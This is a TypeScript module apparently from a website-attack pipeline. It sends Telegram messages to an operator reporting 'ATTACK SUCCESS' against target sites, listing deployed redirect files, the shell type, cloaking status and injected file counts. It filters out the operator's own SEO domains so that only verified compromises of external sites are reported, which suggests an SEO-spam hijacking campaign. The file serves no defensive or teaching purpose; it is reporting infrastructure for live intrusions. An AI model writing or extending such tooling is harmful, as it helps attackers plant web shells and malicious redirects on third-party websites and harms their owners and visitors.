/**
 * Telegram Notifier — Send attack results via Telegram Bot API
 * 
 * Replaces email notifications with Telegram messages.
 * Supports:
 * - Success/failure notifications with details
 * - Deployed URLs with clickable links
 * - Pipeline progress updates
 * - Rich formatting with Markdown
 */

import { ENV } from "./_core/env";
import { fetchWithPoolProxy } from "./proxy-pool";
import { shouldSendNotification as verifyRedirectBeforeSend } from "./redirect-verifier";

// Dynamic SEO domain cache — refreshed periodically
let seoDomainsCache: Set<string> = new Set();
let seoDomainsCacheTime = 0;
const SEO_CACHE_TTL = 5 * 60 * 1000; // 5 minutes

async function getSeoAutomationDomains(): Promise<Set<string>> {
  if (Date.now() - seoDomainsCacheTime < SEO_CACHE_TTL && seoDomainsCache.size > 0) {
    return seoDomainsCache;
  }
  try {
    // Lazy import to avoid circular dependency
    const { getUserSeoProjects } = await import("./db");
    const projects = await getUserSeoProjects();
    const domains = new Set<string>();
    for (const p of projects) {
      if (p.domain) {
        // Normalize domain — strip protocol, www, trailing slash
        const clean = p.domain.replace(/^https?:\/\//, "").replace(/^www\./, "").replace(/\/$/, "").toLowerCase();
        domains.add(clean);
      }
    }
    seoDomainsCache = domains;
    seoDomainsCacheTime = Date.now();
    return domains;
  } catch {
    return seoDomainsCache; // Return stale cache on error
  }
}

// ═══════════════════════════════════════════════════════
//  TYPES
// ═══════════════════════════════════════════════════════

export interface TelegramConfig {
  botToken: string;
  chatId: string;
}

export interface TelegramNotification {
  type: "success" | "failure" | "partial" | "progress" | "info";
  targetUrl: string;
  redirectUrl?: string;
  deployedUrls?: string[];
  shellType?: string;
  duration?: number;
  errors?: string[];
  details?: string;
  keywords?: string[];
  cloakingEnabled?: boolean;
  injectedFiles?: number;
}

interface TelegramSendResult {
  success: boolean;
  messageId?: number;
  error?: string;
}

// ═══════════════════════════════════════════════════════
//  TELEGRAM API
// ═══════════════════════════════════════════════════════

async function sendTelegramMessage(
  config: TelegramConfig,
  text: string,
  parseMode: "MarkdownV2" | "HTML" = "HTML",
): Promise<TelegramSendResult> {
  try {
    const url = `https://api.telegram.org/bot${config.botToken}/sendMessage`;
    
    const { response } = await fetchWithPoolProxy(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: config.chatId,
        text,
        parse_mode: parseMode,
        disable_web_page_preview: false,
      }),
      signal: AbortSignal.timeout(10000),
    }, { targetDomain: "api.telegram.org", timeout: 10000 });

    const result = await response.json() as any;
    
    if (result.ok) {
      return { success: true, messageId: result.result?.message_id };
    } else {
      return { success: false, error: result.description || "Unknown Telegram API error" };
    }
  } catch (error: any) {
    return { success: false, error: error.message };
  }
}

// ═══════════════════════════════════════════════════════
//  GET CONFIG FROM ENV
// ═══════════════════════════════════════════════════════

export function getTelegramConfig(): TelegramConfig | null {
  const botToken = ENV.telegramBotToken;
  const chatId = ENV.telegramChatId;
  
  if (!botToken || !chatId) {
    return null;
  }
  
  return { botToken, chatId };
}

// ═══════════════════════════════════════════════════════
//  NOTIFICATION FORMATTERS
// ═══════════════════════════════════════════════════════

function escapeHtml(text: string): string {
  return text
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

function formatSuccessMessage(notification: TelegramNotification): string {
  const lines: string[] = [];
  
  lines.push("🎯 <b>ATTACK SUCCESS</b> 🎯");
  lines.push("");
  lines.push(`🌐 <b>Target:</b> ${escapeHtml(notification.targetUrl)}`);
  
  if (notification.redirectUrl) {
    lines.push(`🔗 <b>Redirect:</b> ${escapeHtml(notification.redirectUrl)}`);
  }
  
  if (notification.deployedUrls && notification.deployedUrls.length > 0) {
    lines.push("");
    lines.push("✅ <b>Deployed URLs:</b>");
    for (const url of notification.deployedUrls) {
      lines.push(`  • <a href="${escapeHtml(url)}">${escapeHtml(url)}</a>`);
    }
  }
  
  if (notification.shellType) {
    lines.push(`🐚 <b>Shell Type:</b> ${escapeHtml(notification.shellType)}`);
  }
  
  if (notification.keywords && notification.keywords.length > 0) {
    lines.push(`🔑 <b>Keywords:</b> ${notification.keywords.map(k => escapeHtml(k)).join(", ")}`);
  }
  
  if (notification.cloakingEnabled) {
    lines.push(`🎭 <b>Cloaking:</b> Active`);
    if (notification.injectedFiles && notification.injectedFiles > 0) {
      lines.push(`💉 <b>Injected Files:</b> ${notification.injectedFiles}`);
    }
  }
  
  if (notification.duration) {
    lines.push(`⏱ <b>Duration:</b> ${Math.round(notification.duration / 1000)}s`);
  }
  
  if (notification.details) {
    lines.push("");
    lines.push(`📝 ${escapeHtml(notification.details)}`);
  }
  
  lines.push("");
  lines.push(`🕐 ${new Date().toLocaleString("th-TH", { timeZone: "Asia/Bangkok" })}`);
  
  return lines.join("\n");
}

function formatFailureMessage(notification: TelegramNotification): string {
  const lines: string[] = [];
  
  lines.push("❌ <b>ATTACK FAILED</b> ❌");
  lines.push("");
  lines.push(`🌐 <b>Target:</b> ${escapeHtml(notification.targetUrl)}`);
  
  if (notification.redirectUrl) {
    lines.push(`🔗 <b>Redirect:</b> ${escapeHtml(notification.redirectUrl)}`);
  }
  
  if (notification.errors && notification.errors.length > 0) {
    lines.push("");
    lines.push("⚠️ <b>Errors:</b>");
    for (const err of notification.errors.slice(0, 5)) {
      lines.push(`  • ${escapeHtml(err.substring(0, 100))}`);
    }
  }
  
  if (notification.duration) {
    lines.push(`⏱ <b>Duration:</b> ${Math.round(notification.duration / 1000)}s`);
  }
  
  if (notification.details) {
    lines.push("");
    lines.push(`📝 ${escapeHtml(notification.details)}`);
  }
  
  lines.push("");
  lines.push(`🕐 ${new Date().toLocaleString("th-TH", { timeZone: "Asia/Bangkok" })}`);
  
  return lines.join("\n");
}

function formatPartialMessage(notification: TelegramNotification): string {
  const lines: string[] = [];
  
  lines.push("⚠️ <b>PARTIAL SUCCESS</b> ⚠️");
  lines.push("");
  lines.push(`🌐 <b>Target:</b> ${escapeHtml(notification.targetUrl)}`);
  
  if (notification.deployedUrls && notification.deployedUrls.length > 0) {
    lines.push("");
    lines.push("📁 <b>Files Uploaded (redirect not verified):</b>");
    for (const url of notification.deployedUrls) {
      lines.push(`  • <a href="${escapeHtml(url)}">${escapeHtml(url)}</a>`);
    }
  }
  
  if (notification.duration) {
    lines.push(`⏱ <b>Duration:</b> ${Math.round(notification.duration / 1000)}s`);
  }
  
  lines.push("");
  lines.push(`🕐 ${new Date().toLocaleString("th-TH", { timeZone: "Asia/Bangkok" })}`);
  
  return lines.join("\n");
}

function formatProgressMessage(notification: TelegramNotification): string {
  const lines: string[] = [];
  
  lines.push("🔄 <b>PIPELINE PROGRESS</b>");
  lines.push("");
  lines.push(`🌐 <b>Target:</b> ${escapeHtml(notification.targetUrl)}`);
  
  if (notification.details) {
    lines.push(`📝 ${escapeHtml(notification.details)}`);
  }
  
  lines.push("");
  lines.push(`🕐 ${new Date().toLocaleString("th-TH", { timeZone: "Asia/Bangkok" })}`);
  
  return lines.join("\n");
}

// ═══════════════════════════════════════════════════════
//  MAIN: Send Notification
// ═══════════════════════════════════════════════════════

export async function sendTelegramNotification(
  notification: TelegramNotification,
  configOverride?: TelegramConfig,
): Promise<TelegramSendResult> {
  const config = configOverride || getTelegramConfig();
  
  if (!config) {
    return { success: false, error: "Telegram not configured (missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID)" };
  }

  // ═══ STRICT ATTACK-SUCCESS-ONLY FILTER ═══
  // ONLY send notifications for REAL attack successes where:
  // 1. Type is "success"
  // 2. Has deployedUrls with actual URLs (verified redirect/file placement)
  // 3. Target is NOT an SEO automation domain (our own domains)
  // Block EVERYTHING else: info, progress, partial, failure, freshness, distribution, CVE, orchestrator, etc.
  
  // Block all non-success types immediately
  if (notification.type !== "success") {
    console.log(`[Telegram] Blocked ${notification.type} notification for ${notification.targetUrl} (attack-success-only mode)`);
    return { success: true };
  }

  // Block success notifications that are NOT real attacks (no deployed URLs = not a real attack)
  const hasDeployedUrls = notification.deployedUrls && notification.deployedUrls.length > 0;
  const hasRedirectUrl = !!notification.redirectUrl;
  
  // Must have either deployed URLs or redirect URL to prove it's a real attack
  if (!hasDeployedUrls && !hasRedirectUrl) {
    // Check if details contain attack-like indicators
    const details = (notification.details || "").toLowerCase();
    const isRealAttack = details.includes("deployed") || details.includes("injected") || details.includes("redirect") || details.includes("shell");
    if (!isRealAttack) {
      console.log(`[Telegram] Blocked success notification for ${notification.targetUrl} — no deployed URLs or redirect (not a real attack)`);
      return { success: true };
    }
  }

  // Block SEO automation domains (our own domains, not attack targets)
  // These are domains we manage via SEO Automation, not domains we attack
  const targetLower = (notification.targetUrl || "").toLowerCase();
  const detailsLower = (notification.details || "").toLowerCase();
  
  // Block non-attack notifications disguised as success
  const NON_ATTACK_KEYWORDS = [
    "freshness cycle",
    "multi-platform distribution",
    "platform discovery",
    "auto-post",
    "campaign for",
    "agentic seo",
    "ooda cycle",
    "cve database",
    "auto-remediation",
    "proxy",
    "health check",
    "pbn expire",
    "pbn network",
    "auto-started",
  ];
  
  for (const keyword of NON_ATTACK_KEYWORDS) {
    if (detailsLower.includes(keyword) || targetLower.includes(keyword)) {
      console.log(`[Telegram] Blocked non-attack success for ${notification.targetUrl} — matched filter: "${keyword}"`);
      return { success: true };
    }
  }

  // Block system/internal targets (not real external attack targets)
  const SYSTEM_TARGETS = [
    "orchestrator", "auto-pipeline", "cve database", "pbn network",
    "proxy-health-check", "system", "agentic session",
  ];
  
  for (const sys of SYSTEM_TARGETS) {
    if (targetLower.includes(sys)) {
      console.log(`[Telegram] Blocked system target notification: ${notification.targetUrl}`);
      return { success: true };
    }
  }

  // Dynamic filter: Block notifications for domains in our SEO Automation system
  // These are OUR domains that we manage, not external attack targets
  try {
    const seoDomains = await getSeoAutomationDomains();
    const cleanTarget = targetLower.replace(/^https?:\/\//, "").replace(/^www\./, "").replace(/\/$/, "");
    if (seoDomains.has(cleanTarget)) {
      console.log(`[Telegram] Blocked SEO automation domain: ${notification.targetUrl} (this is our own domain)`);
      return { success: true };
    }
    // Also check partial match (e.g., "tos1688.org" in "https://tos1688.org/path")
    const seoDomainsArr = Array.from(seoDomains);
    for (const seoDomain of seoDomainsArr) {
      if (cleanTarget.includes(seoDomain) || seoDomain.includes(cleanTarget)) {
        console.log(`[Telegram] Blocked SEO automation domain (partial match): ${notification.targetUrl} ~ ${seoDomain}`);
        return { success: true };
      }
    }
  } catch {
    // Non-critical — continue sending if DB check fails
  }

  // ═══ REDIRECT VERIFICATION GATE ═══
  // Before sending, verify that deployed URLs actually work and redirect correctly
  if (hasDeployedUrls) {
    try {
      console.log(`[Telegram] Verifying ${notification.deployedUrls!.length} deployed URL(s) before sending...`);
      const verification = await verifyRedirectBeforeSend(
        notification.deployedUrls!,
        notification.redirectUrl || null,
      );

      if (!verification.shouldSend) {
        console.log(`[Telegram] ❌ Redirect verification FAILED for ${notification.targetUrl} — ${verification.verificationSummary}`);
        console.log(`[Telegram] Blocking notification: 0/${verification.totalCount} URLs verified`);
        return { success: true }; // Silently block — don't send unverified attacks
      }

      console.log(`[Telegram] ✅ Redirect verification PASSED: ${verification.verifiedCount}/${verification.totalCount} URLs verified`);
      
      // Enrich the notification with verification data
      if (verification.redirectChainText) {
        notification.details = [
          notification.details || "",
          `\n🔍 Redirect Verified: ${verification.verifiedCount}/${verification.totalCount}`,
          verification.redirectChainText,
        ].filter(Boolean).join("\n");
      }
    } catch (verifyErr: any) {
      // Verification engine error — still send the notification but log warning
      console.warn(`[Telegram] ⚠️ Redirect verification error (sending anyway): ${verifyErr.message}`);
    }
  }

  // If we get here, it's a real, verified attack success — send it!
  console.log(`[Telegram] ✅ Sending VERIFIED attack success for ${notification.targetUrl}`);

  // Only success type reaches here (all others are filtered above)
  const message = formatSuccessMessage(notification);

  return sendTelegramMessage(config, message, "HTML");
}

// ═══════════════════════════════════════════════════════
//  BATCH NOTIFICATION
// ═══════════════════════════════════════════════════════

/**
 * Send a batch summary notification for multiple targets
 */
export async function sendBatchSummary(
  results: Array<{
    targetUrl: string;
    success: boolean;
    deployedUrls: string[];
    errors: string[];
  }>,
  configOverride?: TelegramConfig,
): Promise<TelegramSendResult> {
  const config = configOverride || getTelegramConfig();
  
  if (!config) {
    return { success: false, error: "Telegram not configured" };
  }
  // SUCCESS-ONLY: Only include successful results in batch summary
  const successResults = results.filter(r => r.success);
  
  // Skip batch summary entirely if no successes
  if (successResults.length === 0) {
    console.log(`[Telegram] Skipping batch summary — 0 successes out of ${results.length} targets`);
    return { success: true };
  }
  
  const lines: string[] = [];
  lines.push("📊 <b>BATCH ATTACK SUMMARY</b> 📊");
  lines.push("");
  lines.push(`✅ Success: ${successResults.length} / ${results.length} targets`);
  lines.push("");
  
  
  for (const result of successResults) {
    lines.push(`✅ ${escapeHtml(result.targetUrl)}`);
    if (result.deployedUrls.length > 0) {
      for (const url of result.deployedUrls.slice(0, 2)) {
        lines.push(`  └ <a href="${escapeHtml(url)}">${escapeHtml(url.substring(0, 50))}...</a>`);
      }
    }
  } 
  lines.push("");
  lines.push(`🕐 ${new Date().toLocaleString("th-TH", { timeZone: "Asia/Bangkok" })}`);
  
  return sendTelegramMessage(config, lines.join("\n"), "HTML");
}

// ═══════════════════════════════════════════════════════
//  VERIFY BOT TOKEN
// ═══════════════════════════════════════════════════════

export async function verifyTelegramBot(botToken: string): Promise<{ valid: boolean; botName?: string; error?: string }> {
  try {
    const url = `https://api.telegram.org/bot${botToken}/getMe`;
    const { response } = await fetchWithPoolProxy(url, { signal: AbortSignal.timeout(5000) }, { targetDomain: "api.telegram.org", timeout: 5000 });
    const result = await response.json() as any;
    
    if (result.ok) {
      return { valid: true, botName: result.result?.username };
    } else {
      return { valid: false, error: result.description };
    }
  } catch (error: any) {
    return { valid: false, error: error.message };
  }
}
